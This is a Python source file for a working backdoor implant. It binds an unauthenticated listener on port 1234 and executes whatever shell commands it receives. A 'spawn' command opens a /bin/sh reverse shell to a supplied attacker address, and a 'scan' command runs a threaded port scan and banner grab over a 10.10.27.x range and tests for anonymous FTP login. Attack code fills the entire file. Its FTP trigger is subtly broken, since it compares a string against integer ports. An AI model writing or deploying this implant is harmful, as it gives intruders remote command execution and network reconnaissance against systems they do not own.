##################
# Second Version #
##################

import socket
import subprocess
import threading
import os

# Connection settings

HOST = '0.0.0.0'
PORT = 1234

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind((HOST, PORT))
s.listen(1)
print("Listening on port 1234")


# Network Scanning

network_dummy = ["10.10.27." + str(i) for i in range(70, 100)]  # Dummy Network

target_ports = [15, 20, 21, 22, 23, 25, 50, 51, 53, 67, 68, 69, 80, 88, 110, 139, 143, 161, 389, 443, 445, 3306, 3389, 5601, 5432, 8080, 9200, 9300]  # List of target ports to scan
MAX_THREADS = 16

thread_semaphore = threading.BoundedSemaphore(value=MAX_THREADS)

def scan_ports(ip):
    print(f"Scanning IP: {ip}")

    try:
        for port in target_ports:
            # Create a socket object
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            
            # Set a timeout value for the socket (optional)
            sock.settimeout(2)
            
            # Connect to the target IP and port
            result = sock.connect_ex((ip, port))
            
            if result == 0:
                # Port is open
                try:
                    port_dict[ip].append(port)
                except KeyError:
                    port_dict[ip] = [port]
                    # print(f"Port {port} is open")
                
                # Attempt to fetch the service version
                try:
                    banner = sock.recv(1024).decode('utf-16').strip()
                    print(f"Service version: {banner}")
                except socket.error:
                    print("Failed to fetch service version")
            else:
                # Port is closed
                pass
            
            # Close the socket
            sock.close()
        
    except socket.error:
        print(f"Error occurred while scanning port {port}")

    finally:
        thread_semaphore.release()


def thread_scanner():
    threads = []
    network = iter(network_dummy)

    for i in range(len(network_dummy)):
        target_ip = next(network)

        thread_semaphore.acquire()
        t = threading.Thread(target=scan_ports, args=(target_ip,))
        threads.append(t)
        t.start()

    for t in threads:
        t.join()


# FTP Checks
from ftplib import FTP

# If FTP is open then check for anonymous login and available commands.
def check_ftp_capabilities(hostname):
    try:
        ftp = FTP(hostname)
        ftp.login()  # Try anonymous login

        # Get available commands
        commands = ftp.sendcmd('help').split('\n')
        print("Available FTP commands:")
        for command in commands:
            print(command)

        ftp.quit()
        return "Anonymous FTP access is available."
    except Exception as e:
        return "Anonymous FTP access is not available or failed."


# Entry point of the reverse shell

if __name__ == '__main__':

    while True:
        conn, addr = s.accept()
        print("Connection Accepted from: {}".format(addr))
        data = conn.recv(1024).decode('utf-8')
        try:
            if data:

                if data.startswith('spawn'):
                    spawn_command = data.split()
                    attacker_ip = spawn_command[1]
                    spawn_port = spawn_command[2]
                    spawn_shell = f'python3 -c \'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{attacker_ip}",{spawn_port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")\''

                    ps = subprocess.Popen(spawn_shell, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
                    result = ps.communicate()[0] + str('Spawned').encode('utf-8') + str('; pid: ').encode('utf-8') + str(os.getpid()).encode('utf-8') + str('; ppid: ').encode('utf-8') + str(os.getppid()).encode('utf-8')

                elif data.startswith('scan'):
                    port_dict = {}
                    thread_scanner()
                    ftp_result = ''

                    for key, val in port_dict.items():
                        if '21' in val:
                            hostname = key
                            ftp_result = check_ftp_capabilities(hostname)

                    result = str(port_dict).encode('utf-8') + str(ftp_result).encode('utf-8')
                
                else:
                    # Execute the command and send back the result
                    # result = subprocess.check_output(data.split(), shell=True)
                    ps = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
                    result = ps.communicate()[0] + str('; pid: ').encode('utf-8') + str(os.getpid()).encode('utf-8') + str('; ppid: ').encode('utf-8') + str(os.getppid()).encode('utf-8')

        except Exception as e:
            result = str(e).encode('utf-8')

        conn.send(result)
        conn.close()
